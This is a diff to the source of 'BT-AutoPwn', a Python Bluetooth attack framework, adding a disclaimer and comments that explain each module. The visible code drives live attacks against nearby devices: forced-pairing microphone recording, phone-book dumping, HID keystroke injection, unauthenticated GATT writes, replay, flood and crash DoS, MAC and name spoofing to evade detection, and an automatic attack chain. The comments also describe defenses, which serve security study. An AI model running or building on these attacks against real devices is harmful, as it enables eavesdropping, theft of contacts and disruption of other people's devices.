@@ -1,7 +1,50 @@
 #!/usr/bin/env python3
 """
-BT-AutoPwn v3.0 — Bluetooth Security Testing Framework
-Smart adapter auto-selection · BLE/Classic/Audio · CLI + GUI
+╔══════════════════════════════════════════════════════════════════════════════╗
+║              BT-AutoPwn v3.1 — Bluetooth Security Testing Framework         ║
+║                                                                              ║
+║  ⚠  FOR EDUCATIONAL PURPOSE ONLY — DISCLAIMER ⚠                            ║
+║                                                                              ║
+║  This tool is designed strictly for:                                         ║
+║    • Authorized penetration testing on devices you own or have explicit      ║
+║      written permission to test                                              ║
+║    • Security research and vulnerability disclosure                          ║
+║    • Learning how Bluetooth attacks work in order to DEFEND against them     ║
+║    • CTF (Capture The Flag) competitions and academic labs                   ║
+║                                                                              ║
+║  DO NOT use this tool to:                                                    ║
+║    • Attack devices without explicit authorization                           ║
+║    • Intercept communications of third parties                               ║
+║    • Cause disruption or denial of service to others                         ║
+║    • Engage in any activity that violates local, national, or international  ║
+║      laws (CFAA, GDPR, Canadian Criminal Code s.342.1, EU Directive          ║
+║      2013/40/EU, or equivalent)                                              ║
+║                                                                              ║
+║  We learn how to attack in order to defend better.                           ║
+║  Stay legal. Stay ethical. Get written authorization first.                  ║
+║                                                                              ║
+║  The authors accept NO liability for misuse of this software.                ║
+╚══════════════════════════════════════════════════════════════════════════════╝
+
+BT-AutoPwn — Architecture overview
+────────────────────────────────────
+  Section 1  : Config & constants (version, paths, OUI database, vulnerability DB)
+  Section 2  : Data structures   (BTDevice, LogEntry, AdapterInfo dataclasses)
+  Section 3  : Session logger    (thread-safe log with JSON/TXT/CSV export)
+  Section 4  : Shell helpers     (subprocess wrappers, MAC utils, dep check)
+  Section 5  : Adapter manager   (auto-select best hciX adapter per attack type)
+  Section 6  : Scan engines      (Classic hcitool scan, BLE btmon+lescan, combined)
+  Section 7  : Service enumeration & vuln analysis (SDP, GATT, protocol classifier)
+  Section 8  : Attack modules    (Recon / Exploit / Audio / DoS / CVE / Stealth)
+  Section 9  : Attack registry + auto-chain + risk scoring + HTML report
+  Section 9.5: Explanations & Advisor (per-attack educational text + contextual tips)
+  Section 10 : CLI mode          (Rich TUI — interactive prompts)
+  Section 11 : GUI mode          (tkinter cyberpunk tabs)
+  Section 12 : Entry point       (argparse, dep check, adapter scan, mode selection)
+
+Required system tools (apt):
+  bluez bluez-tools pulseaudio-utils bettercap (optional)
+  lame or ffmpeg (optional, for MP3 audio recording)
 """
 
 import argparse, csv, json, os, queue, random, re, shutil, socket
@@ -26,10 +69,13 @@ console = Console()
 # ═══════════════════════════════════════════════════════════════════════════════
 
 VERSION    = "3.1"
+# All logs, exports, and audio recordings go here — never in /tmp to avoid auto-cleanup
 LOG_DIR    = os.path.expanduser("~/Projects/bt-autopwn/zerosync_logs")
 REC_DIR    = os.path.join(LOG_DIR, "recordings")
 for _d in (LOG_DIR, REC_DIR): os.makedirs(_d, exist_ok=True)
 
+# Names used by the Alias Loop attack to cycle the adapter's visible BT name,
+# making it harder for passive scanners to identify a single attacker.
 FAKE_NAMES = [
     "iPhone 15 Pro", "Galaxy S24 Ultra", "AirPods Pro 2", "Xbox Controller",
     "MacBook Pro M3", "Pixel 8 Pro", "JBL Charge 5", "Sony WH-1000XM5",
@@ -37,6 +83,9 @@ FAKE_NAMES = [
     "Nintendo Switch Pro", "Tile Mate", "Logitech MX Keys", "Surface Pro",
 ]
 
+# OUI = Organizationally Unique Identifier — first 3 bytes of any MAC address.
+# Maps the vendor prefix to a human-readable manufacturer name.
+# Used to identify device brands at scan time without needing SDP enumeration.
 OUI_DB = {
     "00:1A:7D":"Broadcom","00:1B:DC":"Samsung","00:17:F2":"Apple",
     "00:23:12":"Apple","F4:60:E2":"Apple","34:C0:59":"Apple",
@@ -48,6 +97,10 @@ OUI_DB = {
     "44:D4:E0":"OnePlus","8C:79:F5":"Huawei","00:12:A1":"Nokia",
 }
 
+# Vulnerability database keyed by Bluetooth profile/protocol.
+# Each entry lists known CVEs, the attack functions that target it,
+# severity level, and a short description.
+# This DB drives automatic attack selection after service enumeration.
 VULN_DB = {
     "HID":   {"vulns":["MouseJack CVE-2016-10761","HID injection"],          "attacks":["hid_inject"],                                  "severity":"HIGH",    "desc":"Clavier/souris — injection frappes"},
     "A2DP":  {"vulns":["BlueBorne CVE-2017-1000251","Audio intercept"],       "attacks":["audio_intercept","blueborne"],                  "severity":"HIGH",    "desc":"Audio streaming — interception possible"},
@@ -66,6 +119,9 @@ VULN_DB = {
 # SECTION 2 — DATA STRUCTURES
 # ═══════════════════════════════════════════════════════════════════════════════
 
+# BTDevice holds everything discovered about a single Bluetooth target.
+# Fields are populated incrementally: MAC + name at scan time, services
+# and vulnerabilities after full_enum(), RSSI updated live during BLE scan.
 @dataclass
 class BTDevice:
     mac:             str
@@ -88,6 +144,8 @@ class LogEntry:
     level: str   # INFO WARN SUCCESS ERROR ATTACK
     msg:   str
 
+# AdapterInfo describes one physical BT adapter (hci0, hci1, …).
+# The score field drives auto-selection: DUAL=10 > BLE_ONLY=5 > CLASSIC=3.
 @dataclass
 class AdapterInfo:
     iface:       str
@@ -157,6 +215,8 @@ SESSION = SessionLogger()
 # SECTION 4 — SHELL HELPERS
 # ═══════════════════════════════════════════════════════════════════════════════
 
+# Synchronous shell helper — returns (stdout, stderr, returncode).
+# All attack functions use this so results are captured and logged.
 def run(cmd: str, timeout: int = 10) -> tuple[str, str, int]:
     try:
         r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
@@ -164,6 +224,8 @@ def run(cmd: str, timeout: int = 10) -> tuple[str, str, int]:
     except subprocess.TimeoutExpired: return "", "TIMEOUT", -1
     except Exception as e:            return "", str(e), -1
 
+# Background shell helper — returns the Popen object so callers can
+# read stdout in real time (btmon, parecord) or terminate on demand.
 def run_bg(cmd: str) -> subprocess.Popen:
     return subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                             stderr=subprocess.PIPE, text=True)
@@ -342,6 +404,14 @@ def get_iface(attack_id: str = "any") -> str:
 # SECTION 6 — SCAN ENGINES
 # ═══════════════════════════════════════════════════════════════════════════════
 
+# ── HOW IT WORKS ──────────────────────────────────────────────────────────────
+# BT Classic scan uses the Page Inquiry procedure (hcitool scan).
+# The adapter broadcasts an Inquiry (IAC) and listens for FHS packets.
+# Devices must be in "discoverable" mode to respond.
+# We then query RSSI and LMP version for each found MAC.
+# Educational note: RSSI (Received Signal Strength Indicator) tells us how
+# physically close the target is — the stronger the signal, the higher the
+# attack success rate for connection-based attacks.
 def scan_classic(duration: int = 10, log_cb=None) -> list[BTDevice]:
     iface = get_iface("classic_scan")
     ADAPTERS.up(iface)
@@ -367,6 +437,16 @@ def scan_classic(duration: int = 10, log_cb=None) -> list[BTDevice]:
     SESSION.success(f"Classic: {len(devices)} appareil(s)")
     return devices
 
+# ── HOW IT WORKS ──────────────────────────────────────────────────────────────
+# BLE scan uses two parallel processes:
+#   1. hcitool lescan — sends LE_Scan_Enable HCI command, puts adapter in
+#      passive or active scan mode on the 3 advertising channels (37/38/39).
+#   2. btmon — captures raw HCI events and decodes advertisement packets,
+#      giving us RSSI and the full advertising payload (name, UUIDs, TX power).
+# We parse btmon output in real time with regex to extract MAC, RSSI, name.
+# Fallback: bluetoothctl if btmon produces no output (e.g. some kernel configs).
+# Educational note: BLE devices advertise continuously even when idle —
+# a fitness tracker, smartwatch, or IoT sensor is always visible within ~10m.
 def scan_ble(duration: int = 15, log_cb=None) -> list[BTDevice]:
     iface = get_iface("ble_scan")
     ADAPTERS.up(iface)
@@ -446,6 +526,12 @@ def scan_all(duration: int = 15, log_cb=None) -> list[BTDevice]:
 # SECTION 7 — SERVICE ENUMERATION + VULN ANALYSIS
 # ═══════════════════════════════════════════════════════════════════════════════
 
+# ── SDP ENUMERATION ───────────────────────────────────────────────────────────
+# SDP (Service Discovery Protocol) runs on L2CAP PSM 1.
+# sdptool browse sends a "Browse All" ServiceSearchRequest and the target
+# replies with all registered services: name, UUID, RFCOMM channel, versions.
+# Why it matters: every listed service is a potential attack vector.
+# A device with HFP = microphone access. HID = keyboard injection. RFCOMM = AT commands.
 def enum_sdp(mac: str) -> list[str]:
     iface = get_iface("sdp_enum")
     out, _, _ = run(f"sdptool browse {mac} 2>/dev/null", timeout=15)
@@ -454,6 +540,14 @@ def enum_sdp(mac: str) -> list[str]:
     protos = re.findall(r"Protocol:\s*(.+)", out)
     return list(set(names + uuids + protos))
 
+# ── GATT ENUMERATION ──────────────────────────────────────────────────────────
+# GATT (Generic Attribute Profile) is the data layer of BLE.
+# Structure: Services → Characteristics → Descriptors.
+# gatttool --primary lists service handles; --characteristics lists data endpoints.
+# Each characteristic has a handle (address) and UUID (type of data).
+# Standard UUIDs: 0x2A37 = heart rate, 0x2A19 = battery. Custom UUIDs = proprietary.
+# Why it matters: unprotected characteristics can be read or written without auth,
+# allowing data injection, configuration changes, or device control.
 def enum_gatt(mac: str) -> list[dict]:
     iface = get_iface("ble_scan")
     chars = []
@@ -520,12 +614,24 @@ def full_enum(dev: BTDevice) -> BTDevice:
 
 # ── Recon ──────────────────────────────────────────────────────────────────────
 
+# ── RECON ATTACKS ─────────────────────────────────────────────────────────────
+# Recon attacks are passive or low-impact — they gather intelligence without
+# modifying device state. Always run these first to plan the attack strategy.
+
+# SDP Enumeration: maps all exposed services on a BT Classic device.
+# Learning value: understand what "attack surface" means — each open service
+# is a door that may or may not require authentication to enter.
 def atk_sdp_enum(dev, **_):
     iface = get_iface("sdp_enum")
     out, _, _ = run(f"sdptool browse {dev.mac}", timeout=20)
     SESSION.info(f"SDP {dev.mac}: {len(out.splitlines())} lignes")
     return out or "Aucun service SDP"
 
+# RFCOMM Scan: probes all 30 channels of the RFCOMM serial layer.
+# RFCOMM emulates RS-232 serial over BT. Each channel can host a different
+# service (HFP on ch3, SPP on ch1, PBAP on ch17, etc.).
+# Open channels that don't require auth = direct command injection opportunity.
+# Defense: configure paired-only access for all RFCOMM services.
 def atk_rfcomm_scan(dev, **_):
     iface = get_iface("rfcomm_scan")
     SESSION.attack(f"RFCOMM scan {dev.mac}")
@@ -552,6 +658,14 @@ def atk_bettercap_ble(dev, **_):
 
 # ── Exploit ────────────────────────────────────────────────────────────────────
 
+# ── EXPLOIT ATTACKS ───────────────────────────────────────────────────────────
+# Exploit attacks attempt to actively interact with or control a device.
+# These require explicit authorization on devices you own or are testing.
+
+# GATT Write: attempts unauthenticated writes on all discovered BLE characteristics.
+# Many cheap IoT devices (smart locks, fitness trackers, home automation) expose
+# writable characteristics without requiring pairing or authentication.
+# Defense: always set Write permission to "Authenticated" in GATT server config.
 def atk_gatt_write(dev, **_):
     iface = get_iface("gatt_write")
     chars = [c for c in dev.characteristics if c.get("type")=="char"]
@@ -571,6 +685,15 @@ def atk_rfcomm_connect(dev, **_):
     SESSION.attack(f"RFCOMM connect → {dev.mac}")
     return out + err
 
+# BLE MITM (Man-in-the-Middle): places our two adapters as a transparent relay
+# between a BLE device and its legitimate controller.
+# How it works: hci1 connects to the real device; hci0 advertises a clone.
+# The victim controller reconnects to us instead of the real device.
+# All traffic flows through our proxy — we can read, modify, or replay it.
+# Real-world use case: analyzing proprietary BLE protocols from IoT devices
+# when no documentation exists.
+# Defense: use BLE "Secure Connections" (SC) pairing — provides MITM protection
+# through elliptic curve Diffie-Hellman key exchange.
 def atk_ble_mitm(dev, **_):
     iface, iface2 = ADAPTERS.pair_for_mitm()
     if not iface2: return "[ERREUR] MITM nécessite 2 adaptateurs"
@@ -583,6 +706,12 @@ def atk_ble_mitm(dev, **_):
     return (f"btlejuice non installé (npm install -g btlejuice)\n"
             f"Fallback gatttool: gatttool -i {iface2} -b {dev.mac} -I")
 
+# Notification Replay: captures GATT notifications then replays them verbatim.
+# BLE notifications carry sensor data, status updates, or control events.
+# If there's no replay protection (nonce, timestamp, sequence counter),
+# replaying a captured "door unlock" notification still unlocks the door.
+# This is how many cheap smart locks were broken in the 2017-2020 era.
+# Defense: add a monotonic sequence counter or HMAC timestamp to every notification.
 def atk_notif_replay(dev, **_):
     iface = get_iface("notif_replay")
     SESSION.attack(f"Notification Replay → {dev.mac}")
@@ -607,6 +736,11 @@ def atk_notif_replay(dev, **_):
         results.append(f"  handle={h}  val={val[:20]}  → {status}")
     return "\n".join(results)
 
+# PBAP Dump: pulls the full phone book via the Phone Book Access Profile.
+# PBAP was designed for car kits to read contacts. On misconfigured devices
+# it is accessible without user confirmation via the exposed RFCOMM channel.
+# Exported in vCard (.vcf) format: full names, phone numbers, emails, addresses.
+# Defense: require pairing + user confirmation for PBAP access. Disable if unused.
 def atk_pbap_dump(dev, **_):
     out, _, _ = run(f"obexftp -b {dev.mac} -B 17 -l 2>&1", timeout=10)
     if "phonebook" in out.lower():
@@ -627,6 +761,13 @@ def atk_bluejack(dev, **_):
     SESSION.attack(f"Bluejack → {dev.mac}")
     return out + err or "obexftp non disponible"
 
+# HID Injection: connects as a Bluetooth keyboard and injects keystrokes.
+# The OS treats an incoming BT HID device as a trusted keyboard — no confirmation.
+# An attacker within BT range on an unlocked workstation can open a terminal
+# and execute arbitrary commands within seconds.
+# This is the BT equivalent of a USB Rubber Ducky / BadUSB attack.
+# Defense: require authentication for HID pairing; lock screen when away;
+# disable BT when not in use; use "Secure Simple Pairing" with MITM protection.
 def atk_hid_inject(dev, **_):
     iface = get_iface("hid_inject")
     return (f"[HID Inject] {dev.mac}\n"
@@ -636,6 +777,16 @@ def atk_hid_inject(dev, **_):
 
 # ── DoS ────────────────────────────────────────────────────────────────────────
 
+# ── DoS ATTACKS ───────────────────────────────────────────────────────────────
+# Denial of Service attacks disrupt connectivity. They are used in research
+# to test device resilience, or as a precursor to MITM (force reconnect via proxy).
+# ONLY use on your own devices or with explicit written authorization.
+
+# BLE Deauth: forces BLE disconnection via oversized L2CAP packets + HCI commands.
+# BLE has no authenticated disconnect frame — any device can send a termination.
+# Classic use: precursor to MITM attack — disconnect the device from its legit
+# controller so it reconnects through our proxy instead.
+# Defense: implement reconnection rate-limiting and anomaly detection in firmware.
 def atk_ble_deauth(dev, **_):
     iface = get_iface("ble_deauth")
     SESSION.attack(f"BLE Deauth → {dev.mac}")
@@ -647,6 +798,15 @@ def atk_ble_deauth(dev, **_):
     SESSION.success(f"Deauth envoyé: {dev.mac}")
     return f"[l2ping flood]\n{r1}\n[HCI disconnect]\n{r2}\n[Flood] 5 cycles connect/disconnect"
 
+# BLE Device Crasher: sends malformed oversized packets to trigger firmware crashes.
+# Three vectors combined:
+#   1. L2ping with 65000-byte payload — overflows RX buffers on older stacks
+#   2. GATT writes with 128 bytes of 0xFF on every handle — saturates error handler
+#   3. Rapid connect/disconnect flood — exhausts connection table in firmware
+# Research use: firmware fuzzing to find buffer overflow vulnerabilities.
+# If a device crashes and reboots into factory mode → window for unauthorized pairing.
+# Defense: input validation in BT stack (stack developers), watchdog timers,
+# and connection rate limiting.
 def atk_ble_crasher(dev, **_):
     iface = get_iface("ble_crasher")
     SESSION.attack(f"BLE Crasher → {dev.mac}")
@@ -693,6 +853,19 @@ def _zerojam_run(iface: str, duration: int = 30, target: Optional[str] = None) -
 
 # ── CVE ────────────────────────────────────────────────────────────────────────
 
+# ── CVE ATTACKS ───────────────────────────────────────────────────────────────
+# These modules target specific published CVEs.
+# They are educational: understand what the vulnerability is, how it was exploited,
+# and how to verify if a device is patched — so defenders know what to look for.
+
+# BlueBorne (CVE-2017-1000251/1000250) — Armis Research, 2017.
+# A set of 8 critical vulnerabilities in the BT stack of Linux, Android, Windows, iOS.
+# CVE-2017-1000251: Linux kernel BT stack buffer overflow via L2CAP (RCE, no pairing needed).
+# CVE-2017-1000250: Linux BlueZ SDP info leak (used to bypass ASLR before RCE).
+# Assessment here is passive — checks LMP version to estimate patch status.
+# Devices with LMP < 0x0b (BT < 5.1) that haven't applied Sept 2017 security patches
+# are likely still vulnerable.
+# Defense: apply OS security updates. Disable BT when not needed.
 def atk_blueborne(dev, **_):
     iface = get_iface("blueborne")
     out, _, _ = run(f"hcitool -i {iface} info {dev.mac} 2>/dev/null", timeout=10)
@@ -702,6 +875,13 @@ def atk_blueborne(dev, **_):
     SESSION.warn(f"BlueBorne {dev.mac}: {'VULNÉRABLE' if vuln else 'non confirmé'}")
     return f"LMP: {lmp}\nVulnérable BlueBorne probable: {'OUI ⚠' if vuln else 'NON / inconnu'}\n{out[:600]}"
 
+# CVE-2017-0785 — BlueBorne SDP heap info leak (Android/Linux).
+# Sending an SDP Service Search Request with an oversized Continuation State
+# causes the handler to read beyond the allocated buffer and return heap fragments.
+# These leaked bytes contain real memory addresses, defeating ASLR randomization.
+# In a full BlueBorne RCE chain: leak addresses → calculate offsets → craft ROP chain.
+# This module performs the leak probe without the RCE step.
+# Defense: apply Sept 2017 Android Security Bulletin / Linux kernel BT patches.
 def atk_cve_2017_0785(dev, **_):
     iface = get_iface("cve_2017_0785")
     SESSION.attack(f"CVE-2017-0785 SDP info disclosure → {dev.mac}")
@@ -729,6 +909,17 @@ def atk_cve_2017_0785(dev, **_):
 
 # ── Stealth ────────────────────────────────────────────────────────────────────
 
+# ── STEALTH ATTACKS ───────────────────────────────────────────────────────────
+# Stealth techniques reduce the attacker's fingerprint in BT logs and scanners.
+# Used in authorized red-team engagements to test detection capabilities.
+
+# MAC Spoof: changes the adapter's Bluetooth MAC address.
+# The BT MAC is the primary identifier used in pairing databases and device logs.
+# Spoofing lets an attacker: (1) appear as a different device, (2) impersonate
+# a trusted paired device, (3) avoid being correlated across scanning sessions.
+# btmgmt is the preferred method; macchanger is the fallback for older kernels.
+# Defense: monitor for sudden MAC changes on known devices; use BT address randomization
+# awareness in your IDS/monitoring solution.
 def atk_mac_spoof(iface: str = None, fake: str = None) -> str:
     if not iface: iface = ADAPTERS.best("any") or "hci0"
     fake = fake or _rand_mac()
@@ -744,6 +935,12 @@ def atk_mac_spoof(iface: str = None, fake: str = None) -> str:
 
 _alias_stop = threading.Event()
 
+# Alias Loop: cycles the adapter's visible BT name every 2 seconds.
+# Passive BT scanners log device names alongside MACs. By constantly changing
+# the name, an attacker appears as multiple different devices, making it
+# harder to correlate activity to a single source.
+# Can be combined with MAC Spoof for maximum anonymization.
+# Defense: monitor for devices with unusually frequent name changes on your network.
 def atk_alias_loop(iface: str = None, duration: int = 60, names: list = None) -> str:
     if not iface: iface = ADAPTERS.best("any") or "hci0"
     _alias_stop.clear()
@@ -762,6 +959,19 @@ def atk_alias_loop(iface: str = None, duration: int = 60, names: list = None) ->
 
 _rec_procs: dict = {}
 
+# ── BLUE PHANTOM — AUDIO INTERCEPT ────────────────────────────────────────────
+# Audio Intercept targets the HFP (Hands-Free Profile) and HSP (Headset Profile).
+# These profiles activate a full-duplex microphone channel for voice calls.
+# Attack flow:
+#   1. Verify L2CAP reachability (l2ping)
+#   2. Force pair + trust + connect via bluetoothctl agent (auto-accept)
+#   3. Wait for PulseAudio to register the BT device as an audio source
+#   4. Identify the bluez_source.XX.hfp PulseAudio source
+#   5. Record to MP3 (via lame/ffmpeg) or WAV (via parecord) indefinitely
+# Educational use: demonstrates why HFP-capable devices are high-value targets,
+# and why "always-on" Bluetooth on a headset near sensitive conversations is risky.
+# Defense: require PIN confirmation for all new pairings; use "Secure Connections Only"
+# mode; monitor for unexpected new paired devices in your BT device list.
 def atk_audio_intercept(dev, duration: int = 30, **_) -> str:
     iface = get_iface("audio_intercept")
     SESSION.attack(f"Blue Phantom Audio Intercept → {dev.mac}")
@@ -978,9 +1188,18 @@ def auto_chain(dev: BTDevice,
                progress_cb=None,
                stop_evt: threading.Event = None) -> dict:
     """
-    Exécute automatiquement la séquence d'attaque optimale sur un appareil.
-    progress_cb(step_label: str, detail: str) — appelé à chaque étape.
-    Retourne dict {aid: result}.
+    Executes the optimal attack sequence automatically on a single device.
+
+    Phase 1 — Reconnaissance : SDP enumeration (Classic) or Bettercap BLE recon.
+    Phase 2 — Deep enum      : full_enum() to discover all services + GATT chars.
+    Phase 3 — Priority targets: HFP→audio intercept, HID→keystroke inject, PBAP→dump.
+    Phase 4 — Escalation     : RFCOMM, OPP, GATT write, BLE deauth based on services.
+    Phase 5 — CVE checks     : BlueBorne, CVE-2017-0785, KNOB attack.
+    Phase 6 — Summary        : log all results.
+
+    progress_cb(step_label, detail) is called before and after each step for the GUI.
+    stop_evt allows the GUI "Stop Chain" button to interrupt mid-sequence.
+    Returns dict {attack_id: result_string}.
     """
     if stop_evt is None:
         stop_evt = threading.Event()
@@ -1091,7 +1310,14 @@ def auto_chain(dev: BTDevice,
 
 
 def risk_score(dev: BTDevice) -> int:
-    """Calcule un score de risque 0-100 basé sur RSSI, firmware, services et vulnérabilités."""
+    """
+    Calculates a 0-100 risk score based on four weighted factors:
+      - RSSI proximity    (0-10 pts): closer = more viable attacks
+      - Firmware age      (0-10 pts): old LMP versions = unpatched CVEs
+      - High-value services (0-45 pts): HFP/HID/RFCOMM/PBAP score highest
+      - Vulnerability severity (0-35 pts): CRITICAL=15, HIGH=10, MEDIUM=5
+    Score ≥75 = critical risk, ≥50 = high, ≥25 = medium, <25 = low.
+    """
     score = 0
 
     # Proximité / RSSI (0-10)
@@ -2555,6 +2781,8 @@ def run_gui():
 # ═══════════════════════════════════════════════════════════════════════════════
 
 def main():
+    # Root is required for raw HCI socket access (hcitool, btmon, l2ping).
+    # Without it, all scan and attack functions silently fail.
     require_root()
 
     parser = argparse.ArgumentParser(
